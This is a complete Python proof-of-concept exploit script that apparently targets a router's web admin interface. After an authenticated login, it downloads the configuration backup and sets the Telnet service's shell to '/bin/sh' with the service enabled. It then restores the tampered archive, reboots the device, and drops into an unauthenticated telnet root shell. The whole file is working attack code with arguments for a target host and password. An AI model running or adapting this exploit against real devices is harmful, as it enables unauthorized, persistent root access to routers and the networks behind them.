import os
import random
import string
import requests
import json
import logging
import sys
import tarfile
import time
import shutil
import argparse
import warnings

warnings.filterwarnings(action="ignore")
import telnetlib

logging.basicConfig(stream=sys.stdout, level=logging.DEBUG, format="%(message)s")
logging.getLogger("urllib3.connectionpool").setLevel(logging.ERROR)

logger = logging.getLogger(__file__)


class POCRestoreConfig:
    WORKING_DIRECTORY = os.path.join(os.getcwd(), "working_{}".format("".join(random.choices(string.ascii_letters, k=20))))

    def __init__(self, host, port, username, password):
        self.__host = host
        self.__port = port
        self.__username = username
        self.__password = password
        self.__session = None
        if not os.path.exists(self.WORKING_DIRECTORY):
            os.mkdir(self.WORKING_DIRECTORY)
        else:
            raise Exception("[-] The working directory [{}] already exists...".format(self.WORKING_DIRECTORY))

    def __setup_session(self):
        headers = {
            "Host": self.__host,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/json;charset=utf-8",
            "Origin": "http://{}".format(self.__host),
            "Connection": "keep-alive",
        }
        session = requests.session()
        session.cookies.set("DMSD-Access-Token", "INVALID")
        session.cookies.set("device_mode", "router")
        session.headers.update(headers)
        return session

    def __login(self, username, password):
        login_data = {
            "login": username,
            "password": password,
            "staysigned": False
        }
        logger.info("[?] Attempting to login...")
        self.__session = self.__setup_session()

        response = self.__session.post("http://{}:{}/login?".format(self.__host, self.__port), json.dumps(login_data))
        if response.status_code != 200:
            raise Exception("[-] Failed to authenticate")

        response_body = json.loads(response.content)
        if "error" in response_body.keys():
            raise Exception(
                "[-] We got an error message ERR_CODE = {}, ERR_MESSAGE = {}".format(response_body["error"]["code"],
                                                                                     response_body["error"]["message"]))

        access_token = response_body["result"]["AccessToken"]
        self.__session.cookies.set("DMSD-Access-Token", access_token)

        logger.info("[+] Logged in successfully...")

    def __backup(self, destination_directory):
        logger.info("[?] Attempting to download current configuration file...")

        # Download the current configuration file using BACKUP functionality
        response = self.__session.get("http://{}:{}/config_load".format(self.__host, self.__port))
        if response.status_code != 200:
            raise Exception("[-] Failed to download config file")

        # Retrieve the file name from the Content-disposition header
        content_disposition = response.headers.get("Content-disposition")
        file_name = content_disposition.split(";")[1].split("=")[1][1:-1]

        # Drop the current configuration file on disk
        file_path = os.path.join(destination_directory, file_name)
        with open(file_path, "wb") as fd:
            fd.write(response.content)

        logger.info("[+] Downloaded the configuration file successfully...")
        return file_path

    def __add_payload_to_config_file(self, config_file_path):
        logger.info("[?] Attempting to add payload to the file {}...".format(config_file_path))

        with open(config_file_path) as fd:
            config_file = json.load(fd)

        # Here we trigger the vulnerability, field Shell from the Telnet object can be replaced with any binary from disk
        # Replace the Shell field with "/bin/sh" to bypass telnet authentication
        # Replace the Enable field with True to make sure that the telnet service will be started after reboot
        telnet_config_object = config_file["Config"]["Device"]["Services"]["Telnet"]
        telnet_config_object["Enable"] = True
        telnet_config_object["Shell"] = "/bin/sh"

        os.rename(config_file_path, "{}_{}".format(config_file_path, "original"))

        with open(config_file_path, "w") as fd:
            fd.write(json.dumps(config_file, indent=4))

        logger.info("[+] Successfully added payload to config file...")

    def __restore(self, config_backup_file_path):
        logger.info("[?] Attempting to upload file {} via restore functionality...".format(config_backup_file_path))
        headers = {
            "Host": self.__host,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Origin": "http://{}".format(self.__host),
            "Connection": "keep-alive",
        }
        self.__session.headers.clear()
        self.__session.headers.update(headers)

        file = {"file": (os.path.basename(config_backup_file_path), open(config_backup_file_path, "rb"), "application/gzip")}

        response = self.__session.post("http://{}:{}/config_restore".format(self.__host, self.__port), files=file)
        if response.status_code != 200:
            raise Exception("[-] Failed to restore config file")

        response_body = json.loads(response.content)
        if response_body["status"] != 1:
            raise Exception("[-] Failed to restore config file, status={}".format(response.content["status"]))

        logger.info("[+] Successfully uploaded file {} via restore functionality...".format(config_backup_file_path))

    def __reboot(self):
        self.__session.get("http://{}:{}/system_reboot".format(self.__host, self.__port))

    def exploit(self):
        # First step: log in
        self.__login(self.__username, self.__password)

        # Second step: download the current config file using Backup functionality
        backup_cfg_file = self.__backup(self.WORKING_DIRECTORY)

        # Third step: extract the current config file
        extracted_files = []
        with tarfile.open(backup_cfg_file) as fd:
            extracted_files = fd.getnames()
            fd.extractall(self.WORKING_DIRECTORY)

        config_file_path = os.path.join(self.WORKING_DIRECTORY, "config.json")
        if not os.path.exists(config_file_path):
            raise Exception("[-] Something went wrong, {} does not exist".format(config_file_path))

        # Fourth step: replace 2 fields in Telnet object from config file
        # Telnet.Enable = True
        # Telnet.Shell = /bin/sh
        self.__add_payload_to_config_file(config_file_path)

        # Fifth step: repack all the extracted files using the altered config.json file
        os.rename(backup_cfg_file, "{}_{}".format(backup_cfg_file, "original"))
        current_directory = os.getcwd()
        with tarfile.open(backup_cfg_file, "w") as fd:
            os.chdir(self.WORKING_DIRECTORY)
            for file_name in extracted_files:
                fd.add(file_name)
            os.chdir(current_directory)

        # Sixth step: upload the modified configuration archive using Restore functionality
        self.__restore(backup_cfg_file)

        # Seventh step: reboot the system for the config file to be loaded
        self.__reboot()
        logger.info("[?] Waiting 30 seconds for the router to reboot...")
        time.sleep(30)

        # Eighth step: wait for the host to reboot
        seconds_waited = 30
        while True:
            try:
                logger.info("[?] Query host to check if it is online, it may take around 100 seconds, seconds_waited={}".format(seconds_waited))
                self.__session.head("http://{}:{}/admin/index.html#/home".format(self.__host, self.__port), timeout=1)
                logger.info("[+] Host is up and running again...")
                break
            except Exception:
                logger.info("[?] Host is not online yet".format(seconds_waited))
                time.sleep(29)
                seconds_waited += 30

        # We do not need the session anymore
        logger.info("[+] Closing the session...")
        self.__session.close()

        # Cleanup the working directory
        logger.info("[+] Deleting the working directory...")
        shutil.rmtree(self.WORKING_DIRECTORY)

        # Ninth step: connect throw telnet to get a shell
        logger.info("[+] Enjoy your shell ^^...")
        telnet = telnetlib.Telnet(self.__host)
        telnet.interact()


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", required=True, help="The IP of the target")
    parser.add_argument("--port", required=False, help="The port of the http web service, usually 80", default=80)

    # This is an authenticated vulnerability, the script needs username and password for logging in
    parser.add_argument("--username", required=False, help="The username of the admin account from the router", default="admin")
    parser.add_argument("--password", required=True, help="The password of the admin account from the router")
    return parser.parse_args()


if __name__ == "__main__":
    args = get_args()

    try:
        poc = POCRestoreConfig(args.host, args.port, args.username, args.password)
        poc.exploit()
    except Exception as ex:
        logger.error(str(ex))
